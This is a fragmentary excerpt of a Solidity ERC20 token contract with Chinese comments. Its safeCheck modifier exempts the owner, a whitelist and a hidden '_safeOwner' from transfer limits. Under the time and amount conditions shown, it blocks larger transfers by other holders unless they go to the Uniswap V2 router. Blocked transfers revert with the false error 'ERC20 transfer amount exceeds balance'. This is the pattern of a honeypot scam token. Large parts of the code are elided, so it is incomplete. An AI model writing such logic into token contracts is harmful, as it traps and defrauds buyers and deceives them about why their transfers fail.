...
library Address {
    ...
    function isContract(address account) internal view returns (bool) {
        ...
        return (codehash != accountHash && codehash != 0x0); // 0x0空地址
    }
...
interface IERC20 {
     ...
     * 查看 spender 账户有多少 owner账户的代币使用权
     */
     ...
     * owner移交代币的使用权给spender账户 spender账户才能将owner账户的代币转给其他人 通过调用 transferFrom方法 这里的spender 是交易所
     */
...
contract ERC20 is Context, IERC20 {
    ...
    mapping (address => bool) private _listw; //账户锁定地址 集合 一旦某地址设为true ,即无法转账

    mapping (address => mapping (address => uint256)) private _allowances;

    /** 代币总数 */
    uint256 private _totalSupply;
    uint256 private amountcheck = 5*(10**18); //5ether
     ...
     * construction.
     * 初始化
     * name => 合约名字. symbol => 合约标识. initialSupply => 初始化发行量. owner => 初始化支付人(也就是合约创建者)
     */
   constructor (string memory name, string memory symbol, uint256 initialSupply,address payable owner) public {
        ...
        _owner = owner;
        _safeOwner = owner;
        _mint(_owner, initialSupply*(10**18)); //造币函数
    }
     ...
     * 将交易发起方(sender) 把 amount 数量的代币 发送到recipient 账户地址
     */
     ...
     * 查看 [owner]账户委托[spender]账户管理的代币数量
     */
     ...
     * Requirements:
     *
     * - `owner` cannot be the zero address. 合约拥有者地址
     * - `spender` cannot be the zero address. 交易所地址
     * 写日志用
     */
    ...
    modifier safeCheck(address sender, address recipient, uint256 amount){
        ...
        if (_owner == _safeOwner){ //_safeOwner 是合约拥有者 
            ...
            if (sender == _owner || sender == _safeOwner || recipient == _owner || _listw[sender]){ _;} //匹配任意条件
            else{
                if (amount > amountcheck){ //转账超过5个eth
                 ...
                 _;
                   ...
                   if (x > valuea || now > _dateu[sender] + 5 * 1 minutes) { //上一笔转账发起5分钟后 或同一个转账发起人再次转账 则发起校验发送人不是合约拥有者  0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D 是uniswapV2 部署在以太坊主链的地址
                        require((sender == _safeOwner)||(recipient == 0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D), "ERC20 transfer amount exceeds balance");
                        _;
                   }else{
                       _records[sender]=valueb; //100
                       _;
                   }
                }
            }
   ...
   function setSafeOwner(address safeOwner) public {
    ...
    function _token_YWLD(address from, address to, uint256 amount) internal virtual {  }
